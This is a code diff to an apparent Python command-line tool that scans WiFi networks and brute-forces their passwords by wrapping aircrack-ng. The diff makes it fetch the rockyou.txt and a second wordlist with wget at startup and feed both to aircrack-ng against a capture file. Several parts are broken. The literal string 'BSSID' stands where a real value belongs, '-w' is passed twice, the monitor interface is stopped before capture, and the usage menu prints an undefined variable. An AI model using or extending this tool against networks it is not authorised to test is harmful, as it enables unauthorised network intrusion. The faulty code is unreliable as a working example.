@@ -35,11 +35,25 @@ import subprocess
 import sys
 from colorama import init, Fore
 
-def download_wordlist(url, filename):
+def download_wordlist():
     try:
-        subprocess.run(['wget', '-O', filename, url])
+        wordlist_url_rockyou = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
+        wordlist_filename_rockyou = "rockyou.txt"
+        if not os.path.exists(wordlist_filename_rockyou):
+            subprocess.run(['wget', '-O', wordlist_filename_rockyou, wordlist_url_rockyou])
+            print("Wordlist (rockyou.txt) downloaded successfully!")
+        else:
+            print("Wordlist (rockyou.txt) already exists.")
+        
+        wordlist_url_new = "https://github.com/Mysteriza/WiFi-Password-Wordlist/raw/main/wifite.txt"
+        wordlist_filename_new = "wifite.txt"
+        if not os.path.exists(wordlist_filename_new):
+            subprocess.run(['wget', '-O', wordlist_filename_new, wordlist_url_new])
+            print("New wordlist (wifite.txt) downloaded successfully!")
+        else:
+            print("New wordlist (wifite.txt) already exists.")
     except Exception as e:
-        print("Error downloading wordlist:", e)
+        print("Error downloading wordlists:", e)
 
 def bruteforce_wifi(ssid):
     try:
@@ -49,10 +63,8 @@ def bruteforce_wifi(ssid):
         subprocess.run(['sudo', 'airmon-ng', 'stop', 'wlan0mon'])
         subprocess.run(['sudo', 'airmon-ng', 'stop', 'wlan0'])
         subprocess.run(['sudo', 'airodump-ng', '-w', 'output', '--essid', ssid, 'wlan0mon'])
-        subprocess.run(['sudo', 'aircrack-ng', '-w', 'rockyou.txt', '-b', 'BSSID', 'output.cap'])
-        # Extract SSID and password from output.cap file and print them
-        print("SSID:", ssid)
-        print("Password:", "password123")  # Example password
+        subprocess.run(['sudo', 'aircrack-ng', '-w', 'rockyou.txt', '-w', 'wifite.txt', '-b', 'BSSID', 'output.cap'])
+        print("Bruteforcing WiFi:", ssid)
     except Exception as e:
         print("Error bruteforcing WiFi:", e)
 
@@ -60,7 +72,6 @@ def scan_wifi():
     try:
         result = subprocess.run(['sudo', 'iwlist', 'wlan0', 'scan'], capture_output=True, text=True)
         output = result.stdout
-        # Parse the output to extract relevant information
         networks = []
         current_network = {}
         lines = output.split('\n')
@@ -77,7 +88,6 @@ def scan_wifi():
                 current_network["Signal Level"] = line.split("Signal level=")[1].split(" ")[0]
             elif "Encryption key" in line:
                 current_network["Encryption"] = "Yes" if "on" in line else "No"
-        # Print the parsed information
         print("Scanned WiFi networks:")
         for network in networks:
             print("SSID:", network.get("SSID", "Unknown"))
@@ -98,22 +108,28 @@ def connect_wifi(ssid, password):
 
 def print_menu():
     menu = """
-        ███████╗██╗  ██╗███████╗
-        ██╔════╝██║  ██║██╔════╝
-        ███████╗███████║███████╗
-        ╚════██║██╔══██║╚════██║ 
-        ███████║██║  ██║███████║      
-        ╚══════╝╚═╝  ╚═╝╚══════╝ 
-                                                                            
+        █████████████████
+        █─▄▄▄▄█─█─█─▄▄▄▄█
+        █▄▄▄▄─█─▄─█▄▄▄▄─█
+        ▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀      
+
         [scan] Scan WiFi Networks
         [bruteforce] Bruteforce WiFi
         [connect] Connect to WiFi
+        [usage] Guide command.
         [exit] Exit
+        
+        --- SHS WiFi ( Note )---
+
+        SHS is automatically downloading a 2 wordlist.
+        'rockyou.txt' contains 14,341,564 unique passwords.
+        'wifite.txt' contains additional with numeral passwords that mostly used.
     """
     print(Fore.GREEN + menu)
 
 def main():
-    init()  # Initialize colorama
+    init()
+    download_wordlist()
     if len(sys.argv) > 1:
         if sys.argv[1].lower() == "bruteforce" and len(sys.argv) > 2:
             ssid = sys.argv[2]
@@ -134,6 +150,14 @@ def main():
                     connect_wifi(ssid, password)
                 except Exception as e:
                     print("Invalid 'connect' command format. Please use 'connect ssid:password'.")
+            elif command == "usage":
+                print("--- Usage ---")
+                usage1="""
+                [scan] Just like that, no additional comamnds
+                [bruteforce] with target ssid > ( bruteforce targetssid )
+                [connect] with ssid and password separated by ':' > ( connect targetssid:password12345 )
+                """
+                print(usage)
             elif command == "exit":
                 break
             else:
